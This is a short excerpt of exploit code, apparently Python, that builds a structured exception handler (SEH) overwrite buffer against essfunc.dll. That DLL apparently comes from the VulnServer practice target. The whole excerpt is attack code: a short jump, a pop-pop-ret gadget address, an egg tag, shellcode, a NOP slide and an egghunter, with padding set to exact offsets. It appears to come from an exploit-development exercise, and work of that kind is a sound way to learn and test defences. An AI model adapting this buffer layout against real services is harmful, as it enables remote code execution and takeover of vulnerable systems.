...
nseh = "\xEB\x09\x90\x90" # 1st stage, jump over seh gadget
seh = "\xB4\x10\x50\x62" # 0x625010B4 pop pop ret in essfunc.dll

# seh overwrite at offset 3518
crash = "A"*10 # a bit of space before egg and shellcode
crash += "T00WT00W" # egg
crash += shellcode 
crash += "A"*(3518-len(crash)) # fill up to offset 3518
crash += nseh
crash += seh # 48 bytes of space after seh gadget, enough for egghunter and a small nopslide in front
crash += "\x90"*10 # nop slide
crash += egghunter
crash += "\x90"*(4000-len(crash)) # fill up to 4000 bytes
